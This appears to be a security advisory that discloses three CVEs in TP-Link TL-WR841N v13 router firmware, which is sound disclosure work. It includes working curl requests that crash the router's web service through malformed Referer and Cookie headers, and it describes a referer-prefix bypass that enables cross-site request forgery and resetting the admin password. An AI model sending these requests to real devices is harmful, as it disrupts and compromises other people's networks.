# [R1] TP-Link TL-WRN841N Multiple Vulnerabilities

Critical

[← View More Research Advisories](/security/research)
### Synopsis

Tenable was recently investigating TP-Link's [TL-WR841N](https://www.tp-link.com/us/products/details/TL-WR841N.html) v13 using firmware 0.9.1 4.16 v0348.0 (listed as [TL-WR841N(US)\_V13\_180119](https://www.tp-link.com/us/download/TL-WR841N_V13.html#Firmware) on the download page). As a result, Tenable found multiple vulnerabilities.

#### CVE-2018-15700: httpd Denial of Service via Referer Header

A locally connected user sending an HTTP request with a missing protocol string in the "Referer" field will result in the **httpd** service terminating. We believe this is a NULL pointer dereference error in the *http\_parser\_main* function. The problem starts with a *memcmp* looking for "http://" in the first seven bytes of the "Referer" field. Only if this succeeds will a "Referer" string variable be initialized. When the *memcmp* fails the program flow still continues and attempts string operations on the uninitialized NULL string. The resulting crash requires a router reboot to revive **httpd** web interface.

```

curl 'http://tplinkwifi.net/' -H 'Connection: keep-alive' -H 'Cache-Control: max-age=0' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' -H 'Referer: DOS' -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: en-US,en;q=0.9' --compressed

```
#### CVE-2018-15701: httpd Denial of Service via Cookie Header

Crafting an HTTP request with an HTTP "Cookie" field of "Authorization;" will result in the **httpd** service terminating. Again, a router reboot is required to revive the web interface. We believe this is another parsing error in "http\_parser\_main".

```

curl 'http://tplinkwifi.net/' -H 'Connection: keep-alive' -H 'Cache-Control: max-age=0' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' -H 'Referer: http://tplinkwifi.net/' -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: en-US,en;q=0.9' -H 'Cookie: Authorization;' --compressed

```
#### CVE-2018-15702: XSRF due to Incomplete Referer Check

In the *http\_parser\_main* function, referer whitelisting is accomplished using *strncmp* with a length field derived from "tplinklogin.net", "tplinkwifi.net", or router IP strings. Since *strncmp* is only comparing the first few characters of the referer domain string, an attacker can pass this check by crafting a domain or subdomain of "tplinklogin.net\*\*", "tplinkwifi.net\*", or "<router's IP>\*".

This issue is magnified in severity due to a previously disclosed but unpatched authentication bypass vulnerability ([CVE-2018-11714](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-11714)). This allows a remote attacker to perform XSRF to various sensitive cgi scripts. A remote attacker is able enable remote management and reset the router admin password.

### Solution

Currently no solution exists. At time of publication, the most recent firmware version on TP-Link's website is listed as [TL-WR841N(US)\_V13\_180119](https://www.tp-link.com/us/download/TL-WR841N_V13.html#Firmware) which is the vulnerable firmware version (0.9.1 4.16 v0348.0).
